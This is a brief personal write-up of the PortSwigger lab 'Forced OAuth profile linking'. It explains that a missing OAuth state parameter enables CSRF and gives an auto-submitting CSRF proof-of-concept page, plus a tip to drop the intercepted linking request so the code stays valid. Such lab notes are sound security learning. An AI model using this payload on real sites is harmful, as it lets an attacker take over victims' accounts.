# [Forced OAuth profile linking] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-20
 
---
 
## Vulnerability / core concept
OAuth

---


## Payload / key command
Web application allows users to attach their social profile to their account using OAuth authentication. However, during OAuth implementation, `state` parameter was not configured and requests are sent without it. Therefore, this leads to a CSRF attack where attacker can attach victim's account to their social profile by sending the following CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7500d204ac318280471223000a00b2.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="HPuIX5sEalSjSkzheepdRtq5H7jX2j&#95;mP&#45;rOBD8R&#95;i1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Note: while intercepting and receiving `/oauth-linking?` request, it is important to drop it so the code stays valid.
